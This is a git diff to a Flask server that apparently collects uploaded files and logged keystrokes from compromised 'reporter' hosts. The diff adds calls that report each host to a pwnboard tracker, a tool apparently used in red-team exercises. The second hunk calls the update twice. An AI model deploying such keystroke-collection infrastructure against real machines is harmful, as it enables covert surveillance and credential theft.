@@ -6,6 +6,7 @@ Author: Chris Vantine
 import os
 from flask import Flask, request
 from werkzeug.utils import secure_filename
+from utilities import pwnboard
 import data as databaseobj
 
 
@@ -46,6 +47,12 @@ def init():
         :param host: ip of reporter
         :return:  "invalid" if failed, "success" if successful
         """
+        # call to pwnboard
+        try:
+            pwnboard.sendUpdate(host.split("-")[-1])
+        except:
+            print("Failed pwnboard call")
+
         # set upload folder to hostname
         app.config['UPLOAD_FOLDER'] = "static/" + host
         try:
@@ -78,12 +85,16 @@ def init():
         :param host: ip of reporter
         :return: "invalid" if failed, "success" if successful
         """
+        # call to pwnboard
         try:
-            print("1")
+            pwnboard.sendUpdate(host.split("-")[-1])
+        except:
+            print("Failed pwnboard call")
+            
+        try:
+            pwnboard.sendUpdate(host.split("-")[-1])
             data = request.data
-            print("2")
             database.add_keystroke(host, data)
-            print("3")
             return "success"
         except:
             return "failed"
